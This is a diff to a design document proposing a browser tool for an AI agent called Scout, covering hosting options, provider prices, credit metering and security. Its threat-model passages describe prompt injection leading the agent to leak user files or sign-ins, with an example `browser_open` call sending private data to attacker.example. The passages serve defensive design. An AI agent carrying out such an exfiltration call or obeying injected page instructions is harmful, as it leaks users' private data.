@@ -871,7 +871,7 @@ A small negative balance (one turn's overrun) is allowed and recovered from the 
 
 ## 11. Proposal: Scout's browser (not built; the founder decides)
 
-**Status:** a proposal written 2026-10-03 for `docs/launch-plan.md` D10. No browser code exists. Prices were read on the providers' own pages on 2026-10-03 (links at the end).
+**Status:** a proposal written 2026-10-03 for `docs/launch-plan.md` D10, checked and completed 2026-10-04. No browser code exists. Prices were read on the providers' own pages on 2026-10-03 and read again on 2026-10-04; every number in 11.3 was the same on both days (links at the end).
 
 **What is wanted:** on the Max plan, Scout can drive a real browser (open a page, click, type, read what a script-heavy page shows) at **2 credits per minute**. `read_page` covers plain pages already; the browser is for pages that need JavaScript, clicks or forms.
 
@@ -889,7 +889,7 @@ A small negative balance (one turn's overrun) is allowed and recovered from the 
 | **The locked network** | **Lost for that container.** A browser must reach any site, so the egress proxy would have to allow every domain. Then anything in the container (the user's files, memory, cloned code, a Claude Code sign-in) can be sent anywhere by one injected instruction | **Kept.** The container still reaches only the api, LiteLLM and git. The browser is outside it |
 | **Logged-in sessions** | Cookies would live in the user's `/data` volume on our server, and in the nightly backup | Cookies would live at the provider (Browserbase calls it a context, encrypted at rest). A third party holds them. **Proposed for launch: no saved logins at all** (public pages only) |
 | **Prompt injection** | The browser sits next to the user's data with an open network. This is the dangerous mix, and the platform can't check where the browser goes | The page can only reach what Scout can: `web_search`, `read_page` and the browser tools. Navigation goes through the platform, so the seen-address rule can be applied to it (section 11.5). The worst case is Scout typing something into a page. On Hermes, Scout's tool limits are only instructions (section 0.7), so the platform's checks are what counts |
-| **Metering browser minutes** | The Bridge reports browser seconds; the vm-manager already stores them per awake period and the usage sync already reads them | The api opens and closes every session, so it knows the seconds. They are added to the same usage sync and the same `browserCredits` |
+| **Metering browser minutes** | The Bridge reports browser seconds; the vm-manager already stores them per awake period (`browser_seconds` in *GetUsage*) and the usage sync already reads and charges them. Nothing new on the platform | The api opens and closes every session, so it knows the seconds. The usage sync adds them to the browser seconds it already charges: the same 2 credits per minute, the same carry-over of part minutes, the same `browserCredits` in usage. New: a session table, and closing sessions that were left open |
 | **Plan check** | In the vm-manager and the image | In the tool: not on Max → the tool says so |
 | **Work to build** | Image, vm-manager (memory by plan, egress rules, metering), Bridge tools | Platform tools, one provider client, a session table, the sync. One repo |
 | **Risk of the provider** | None | A new supplier and a monthly bill. The provider sees the pages Scout opens |
@@ -903,7 +903,7 @@ A small negative balance (one turn's overrun) is allowed and recovered from the 
 | | Startup | $99 a month | 500 hours included, then $0.10 an hour | 100 | not stated on the page | Proxy: 5 GB included, then $10 per GB |
 | **Steel** | Launch | $0 + usage ($30 of credit once) | $0.10 an hour | 10 | 15 minutes | Proxy $10 per GB, captcha $3 per 1,000 |
 | | Scale | $250 a month + usage ($100 of credit a month) | $0.08 an hour | 100 | 1 hour | Proxy $6 per GB, captcha $1 per 1,000 |
-| **Browserless** | Prototyping | $25 a month (billed yearly) | 20,000 units (a unit is up to 30 seconds), then $0.0020 a unit: about $0.24 an hour | 10 | 15 minutes | Proxy: 6 units per MB (residential) |
+| **Browserless** | Prototyping | $25 a month (billed yearly) | 20,000 units (a unit is up to 30 seconds), then $0.0020 a unit: about $0.24 an hour | 10 (the page shows "+5" next to it) | 15 minutes | Proxy: 6 units per MB (residential), 2 per MB (datacenter) |
 | | Starter | $140 a month (billed yearly) | 180,000 units, then $0.0017 a unit | 40 | 30 minutes | |
 
 ### 11.4 Cost against 2 credits per minute
@@ -929,10 +929,10 @@ Proposed limits for the first version: Max plan only; one browser session per us
 
 **Navigation needs the seen-address rule too** (added 2026-10-04). A browser that opens any address the agent types is the same way out as an unchecked `read_page`: `browser_open("https://attacker.example/?d=<private data>")`. So `browser_open` must take only an address already seen for this user (section 5.1), and links the browser shows count as seen, like links on a read page. Two things are harder than with `read_page` and need their own answer before the browser is built: **typing** (`browser_type` puts agent-chosen text into a page, which is a way out by itself; the first version could allow typing only into a search box on a seen page, or ask for approval), and **requests the page makes by itself** (scripts, images and redirects, which a hosted browser fetches without asking us). With option (a) the platform can't apply the rule at all: the browser sits in the container and the open network is the way out.
 
-**What the founder decides:** option (a) or (b); if (b), which provider and who opens the account; whether Scout may ever stay logged in to a site, and where those cookies may live.
+**What the founder decides:** option (a) or (b); if (b), which provider and who opens the account; whether Scout may ever stay logged in to a site, and where those cookies may live; how far Scout may type into pages (the way out that the seen-address rule doesn't cover).
 
 **Not checked:** how Browserbase and Steel bill a session that is opened and left idle, the longest session on Browserbase's paid plans, and whether Chromium runs acceptably under gVisor in our image (only needed for option (a)).
 
-**Sources** (read 2026-10-03): [Browserbase pricing](https://www.browserbase.com/pricing) · [Browserbase contexts](https://docs.browserbase.com/features/contexts) · [Steel pricing and limits](https://docs.steel.dev/overview/pricinglimits) · [Browserless pricing](https://www.browserless.io/pricing) · [Railway's Playwright guide](https://docs.railway.com/guides/playwright) (1 GB for a Chromium container) · our measured container memory: `vm-manager/README.md`.
+**Sources** (read 2026-10-03 and again 2026-10-04): [Browserbase pricing](https://www.browserbase.com/pricing) · [Browserbase contexts](https://docs.browserbase.com/features/contexts) · [Steel pricing and limits](https://docs.steel.dev/overview/pricinglimits) · [Browserless pricing](https://www.browserless.io/pricing) · [Railway's Playwright guide](https://docs.railway.com/guides/playwright) (1 GB for a Chromium container) · our measured container memory: `vm-manager/README.md`.
 
 > Hosting, server setup and sizing live in a separate doc, `docs/deployment.md`. They are not needed to write the code.
